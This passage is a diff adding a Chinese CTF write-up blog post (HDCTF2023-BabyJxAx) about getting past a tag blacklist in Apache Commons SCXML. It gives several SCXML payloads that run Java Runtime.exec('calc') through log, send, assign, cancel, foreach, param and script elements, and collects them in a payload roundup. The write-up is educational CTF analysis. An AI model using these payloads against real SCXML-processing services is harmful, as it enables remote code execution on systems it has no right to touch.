class="line">            <span class="keyword">return</span> <span class="string">&quot;revenge?&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            System.out.println(var5);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;revenge?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>黑名单有很多，那么第一层只能选择final：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763437976671-47006ab3-b15a-4226-a968-9625bb83142e.png"  alt="img"></p>
+<p>第二层只能onexit：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763438006450-6bdf81c0-8ffe-42c8-a5f8-bef1a412a820.png"  alt="img"></p>
+<p>第三层可选的就比较多了，assign，log，send，cancel都可以，这里以log为例</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">log</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">log</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">send</span> <span class="attr">hints</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">send</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为什么是hints，看Action的实现类：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763438319785-73ddecdf-a6f6-4e3d-a5a9-a23dc4c1d2e7.png"  alt="img"></p>
+<p>其他也是一样的。</p>
+<h1 id="payload整理"><a href="#payload整理" class="headerlink" title="payload整理"></a>payload整理</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">send</span> <span class="attr">hints</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">send</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">log</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">log</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span> <span class="attr">location</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">assign</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cancel</span> <span class="attr">sendidexpr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">cancel</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">array</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span> <span class="attr">item</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">cond</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最内层的都可以</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里又发现一个新问题，finalize的子标签不能为send：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1763439794278-b7dee453-790f-4630-9817-1034a023adb9.png"  alt="img"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parallel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">invoke</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">content</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">invoke</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parallel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其他的就不写了，都差不多。</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                HDCTF2023-BabyJxAx
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/11/18/HDCTF2023-BabyJxAx/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-11-18 12:40</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF-Java/">CTF-Java</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/11/10/RMI-JRMP-JEP290-LDAP%E5%9F%BA%E7%A1%80%E6%A2%B3%E7%90%86/"
+                                   title="RMI JRMP JEP290 LDAP基础梳理"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">RMI JRMP JEP290 LDAP基础梳理</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9Fpayload%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">原payload深入分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#payload%E6%95%B4%E7%90%86"><span class="nav-number">4.</span> <span class="nav-text">payload整理</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">93.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9Fpayload%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">原payload深入分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">解题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#payload%E6%95%B4%E7%90%86"><span class="nav-number">4.</span> <span class="nav-text">payload整理</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
